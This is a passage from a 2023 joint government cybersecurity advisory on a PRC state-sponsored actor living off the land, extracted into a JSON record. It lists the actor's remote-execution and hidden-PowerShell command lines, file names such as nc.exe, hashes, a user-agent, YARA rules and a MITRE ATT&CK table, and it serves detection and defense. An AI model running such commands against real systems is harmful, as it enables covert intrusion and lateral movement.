dir /S \\\\* >> * \n cmd.exe /Q /c * 1> \\\\127.0.0.1 \\ADMIN$\\__*.*>&1  \n powershell start -process -filepath c: \\windows\\temp\\*.exe -\nwindowstyle hidden  \nFile paths \nThe most common paths where files and executables used by the actor have been \nfound include:  \n C:\\Users\\Public\\Appfile (including subdirectories)  \n C:\\Perflogs (including subdirectories)  \n C:\\Windows\\Temp (including subdirectories)  \nFile names  \nThe file names the actor has previously used for such things as malware, scripts, and \ntools include:  \nbackup.bat  cl64.exe  update.bat  Win.exe  \nbillagent.exe  nc.exe  update.exe  WmiPrvSE.exe  \nbillaudit.exe  rar.exe  vm3dservice.exe  WmiPreSV.exe  \ncisco_up.exe  SMSvcService.exe  watchdogd.exe   \nIn addition to the file names and paths above, malicious files names, believed to be \nrandomly created, in the following format have also been discovered: \nC:\\Windows\\[a-zA-Z]{8}.exe  \nSHA -256 file hashes  \n f4dd44bc19c19056794d29151a5b1bb76afd502388622e24c863a8494af147dd  \n ef09b8ff86c276e9b475a6ae6b54f08ed77e09e169f7fc0872eb1d427ee27d31  \n d6ebde42457fe4b2a927ce53fc36f465f0000da931cfab9b79a36083e914ceca  \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  19 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n  472ccfb865c817 04562ea95870f60c08ef00bcd2ca1d7f09352398c05be5d05d  \n 66a19f7d2547a8a85cee7a62d0b6114fd31afdee090bd43f36b89470238393d7  \n 3c2fe308c0a563e06263bbacf793bbe9b2259d795fcc36b953793a7e499e7f71  \n 41e5181b9553bbe33d91ee204fe1d2ca321ac123f9147bb475c0ed32f9488597  \n c7fee7a3ffaf0732f42d89c4399cbff219459ae04a81fc6eff7050d53bd69b99  \n 3a9d8bb85fbcfe92bae79d5ab18e4bca9eaf36cea70086e8d1ab85336c83945f  \n fe95a382b4f879830e2666473d662a24b34fccf34b6b3505ee1b62b32adafa15  \n ee8df354503a56c62719656fae71b3502acf9f87951c55ffd955feec90a11 484 \nUser -agent  \nIn some cases, the following user -agent string (including the extra spacing) was \nidentified performing reconnaissance activities by this actor:  \nMozilla/5.0 (Windows NT 6.1; WOW64; rv:68.0)        \nGecko/20100101 Firefox/68.0  \nNote:  The spacing between  ) and Gecko  is 3 tabs followed by 4 spaces.  \nYara rules \nrule ShellJSP {  \n    strings:  \n        $s1 = \"decrypt(fpath)\"  \n        $s2 = \"decrypt(fcontext)\"  \n        $s3 = \"decrypt(commandEnc)\"  \n        $s4 = \"upload failed!\"  \n        $s5 = \"aes.encrypt(allStr)\"  \n        $s6 = \"newid\" \n \n    condition:  \n        filesize < 50KB and 4 of them  \n} \n  \n \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  20 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n rule EncryptJSP {  \n    strings:  \n        $s1 = \"AEScrypt\"  \n        $s2 = \"AES/CBC/PKCS5Padding\"  \n        $s3 = \"SecretKeySpec\"  \n        $s4 = \"FileOutputStream \" \n        $s5 = \"getParameter\"  \n        $s6 = \"new ProcessBuilder\"  \n        $s7 = \"new BufferedReader\"  \n        $s8 = \"readLine()\"  \n \n    condition:  \n        filesize < 50KB and 6 of them  \n} \nrule CustomFRPClient {  \n   meta: \n        description=Identify instances of the actor's custom FRP tool based \non unique strings chosen by the actor and included in the tool  \n   strings:  \n        $s1 = \"%!PS -Adobe-\" nocase ascii wide  \n        $s2 = \"github.com/fatedier/frp/cmd/frpc\" nocase a scii wide  \n        $s3 = \"github.com/fatedier/frp/cmd/frpc/sub.startService\" nocase \nascii wide  \n        $s4 = \"MAGA2024!!!\" nocase ascii wide  \n        $s5 = \"HTTP_PROXYHost: %s\" nocase ascii wide  \n    \n   condition:  \n        all of them  \n} \nrule HACKTOOL_FRPClien t { \n   meta: \n        description=Identify instances of FRP tool ( Note: This tool is \nknown to be used by multiple actors, so hits would not necessarily imply \nactivity by the specific actor described in this report) \n   strings:  \n        $s1 = \"%!PS -Adobe-\" nocase ascii wide  \n        $s2 = \"github.com/fatedier/frp/cmd/frpc\" nocase ascii wide  \n        $s3 = \"github.com/fatedier/frp/cmd/frpc/sub.startService\" nocase \nascii wide  \n        $s4 = \"HTTP_PROXYHost: %s\" nocase ascii wide  \n    \n   condition:  \n        3 of the m \n} \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  21 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n References  \nActive Directory and domain controller hardening:  \n Best practices: https://learn.micros oft.com/en -us/windows -server/identity/ad -\nds/plan/security -best-practices/best -practices -for-securing -active -directory   \nCISA regional cyber threats:  \n PRC state -sponsored  activity : China Cyber Threat Overview and Adv isories  \nMicrosoft Threat Intelligence blog:  \n Volt Typhoon activity: https://www.microsoft.com/en -\nus/security/blog/2023/05/24/volt -typhoon -targets -us-critical -infrastructure -with-\nliving -off-the-land-techniques/   \nNtdsutil.exe:  \n Overview: https://learn.microsoft.com/en -us/previous -versions/windows/it -\npro/windows -server -2012 -r2-and-2012/cc753343(v=ws.11)  \nPowerShell:  \n Best p ractices: https://media.defense.gov/2022/Jun/22/2003021689/ -1/-\n1/0/CSI_KEEPING_POWERSHELL_SECURITY_MEASURES_TO_USE_AND_\nEMBRACE_20220622.PDF  \n Logging configuration: https://www.mandiant.com/resources/blog/greater -visibility  \nWindows command l ine process auditing:  \n Overview: https://learn.microsoft.com/en -us/windows -server/identity/ad -\nds/manage/component -updates/command -line-process -auditing  \nWindows Defender Firewall:  \n Best practices: https://learn.microsoft.com/en -us/windows/security/threat -\nprotection/windows -firewall/best -practices -configuring  \n Logging c onfiguration: https://learn.microsoft.com/en -us/windows/security/threat -\nprotection/windows -firewall/configure -the-windows -firewall -log \nWindows management i nstrumentation : \n Events: https://learn.microsoft.com/en -us/windows/win32/wmisdk/tracing -wmi-\nactivity#obtaining -wmi-events -through -event -viewer  \n Tracing a ctivity: https://learn.microsoft.com/en -us/windows/win32/wmisdk/tracing -\nwmi-activity  \nWindows p assword spraying :  \n Logging and p laybook  configuration: https://learn.microsoft.com/en -\nus/security/compass/incident -response -playbook -password -spray  \n  \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  22 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n Acknowledgements  \nThe NSA Cybersecuri ty Collaboration Center, along with the authoring agencies, \nacknowledge Amazon Web Services (AWS) Security, Broadcom, Cisco Talos, Google's \nThreat Analysis Group, Lumen Technologies, Mandiant, Microsoft Threat Intelligence \n(MSTI), Palo Alto Networks, Secur eWorks, SentinelOne, Trellix, and additional industry \npartners for their collaboration on this advisory.  \nDisclaimer of endorsement  \nThe information and opinions contained in this document are provided \"as is\" and without any warranties \nor guarantees. Reference herein to any specific commercial products, process, or service by trade name, \ntrademark, manufacturer, or otherwise does not c onstitute or imply its endorsement, recommendation, or \nfavoring by the authoring agencies governments , and this guidance shall not be used for advertising or \nproduct endorsement purposes.  \nTrademark recognition  \nActive Directory, Microsoft, PowerShell, and Windows are registered trademarks of Microsoft \nCorporation . MITRE and ATT&CK are registered trademarks of The MITRE Corporation.  \nPurpose  \nThis document was developed in furtherance of the authoring agencies  cybersecurity missions, including \ntheir responsibilities to identify and disseminate threats, and to develop and issue cybersecurity \nspecifications and mitigations. This information may be shared broadly to reach all appropriate \nstakeholders.  \nContact  \nU.S. organizations : Urgently report any anomalous activity or incidents, including based upo n tech nical \ninformation associated with this Cybersecurity Advisory, to CISA at Report@cisa.dhs.gov  or \ncisa.gov/repor t or to the FBI via your local FBI field office listed at https://www.fbi.gov/contact -us/field -\noffices .   \nNSA Cybersecurity Report Questions and Feedback: CybersecurityReports@nsa.gov   \nNSA Defense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.gov   \nNSA Media Inquiries / Press Desk: 443 -634-0721, MediaRelations@nsa.gov  \nAustralian organizations : Visit cyber.gov.au  or call 1300 292 371 (1300 CYBER 1) to report \ncybersecurity incidents and to access alerts and advisories.  \nCanadian organizations : Report incidents by emailing CCCS at contact@cyber.gc.ca .  \nNew Zealand organizations : Report cyber security incidents to incidents@ncsc.govt.nz  or call 04 498 \n7654.  \nUnited Kingdom organizations : Report a significant cyber security incident at ncsc.gov.uk/report -an-\nincident  (monitored 24 hours) or, for urgent assistance, call 03000 200 973.  \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  23 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n Appendix: M ITRE ATT&CK Techniques  \nTable 2  captures  all referenced threat actor tactics and techniques in this advisory.  \nTable 2: All referenced threat actor tactics and techniques  \nInitial Access  \nTechnique Title  ID Use \nExploit Public -facing Application  T1190  Actor use d public -facing applications to gain \ninitial access to systems; in this case, \nEarthworm and PortProxy.  \nExecution  \nWindows Management \nInstrumentation  T1047  The actor executed WMIC commands to \ncreate a copy of the SYSTEM registry.  \nCommand and Scripting \nInterpreter: PowerShell  T1059.001  The actor used a PowerShell command to \nidentify successful logons to the host.  \nCommand and Scripting \nInterpreter: Windows Command \nShell  T1059.003  The actor used this primary command \nprompt to  execute a query that collected \ninformation about the storage devices on \nthe local host.  \nPersistence  \nServer Software Component: Web \nShell  T1505.003  The actor used backdoor web servers with \nweb shells to establish persistence to \nsystems, including some of the webshells \nbeing derived from Awen  webshell.  \nDefense Evasion  \nIndicator Removal  T1070 The actor selectively cleared Windows \nEvent Logs, system logs, and other \ntechnical artifacts to remove evidence of \ntheir intrusion activity.  \nIndicator Removal: Clear Windows \nEvent Logs  T1070.0 01 The actor cleared system event logs to hide \nactivity of an intrusion.  \nCredential Access  \nOS Credential Dumping: NTDS  T1003.003  The actor may try to exfiltrate the ntds.dit  \nfile and the SYSTEM registry hive out of the \nnetwork to perform password cracking.  \nBrute Force  T1110  The actor attempted to gain access to \naccounts with multiple password attempts.  \nBrute Force:  Password Spraying  T1110.003  \n The actor used commonly used passwords \nagainst accounts to attempt to acquire valid \ncredentials.  \nOS Credential Dumping  T1003  The actor used additional commands to \nobtain credentials in the environment.  \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  24 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n Credentials from Password Stores  T1555  The actor searched for common password \nstorage locations.  \nDiscovery  \nSystem Information Discovery  T1082  The actor executed commands to gather \ninformation about local drives.  \nSystem Owner/User Discovery  T1033  The actor gathered information about \nsuccessful logons to the host using a \nPowerShell command.  \nPermission Groups Discovery: \nLocal Groups  T1069.001  The actor attempt to find local system \ngroups and permission settings.  \nPermission Groups Discovery: \nDoman Groups  T1069.002  The actor used commands to enumerate \nthe active dir ectory structure.  \nSystem Network Configuration \nDiscovery  T1016  The actor used commands to enumerate \nthe network topology.  \nCommand and Control  \nProxy  T1090  The actor used commands to enable port \nforwarding on the host.  \nProxy: External Proxy  T1090.002  The actor used compromised SOHO \ndevices (e.g. routers) to obfuscate the \nsource of their activity.  \n \n\n",
  "cves": [],
  "techniques": [
    "T1069.002",
    "T1090",
    "T1190",
    "T1059.003",
    "T1505.003",
    "T1082",
    "T1059.001",
    "T1070.001",
    "T1003.003",
    "T1090.002",
    "T1069.001",
    "T1016",
    "T1110.003",
    "T1047",
    "T1070",
    "T1033",
    "T1003",
    "T1555",
    "T1110"
  ],
  "advisory": "cybersecurity-alerts",
  "title": "csa_prc_state_sponsored_cyber_living_off_the_land_v1.1",
  "source": "nsa",
  "id": "3cce89baae1ee52ffb74ea494b013bb5e43478d62d6e994a8a3c7ecdc0aafcf1"
}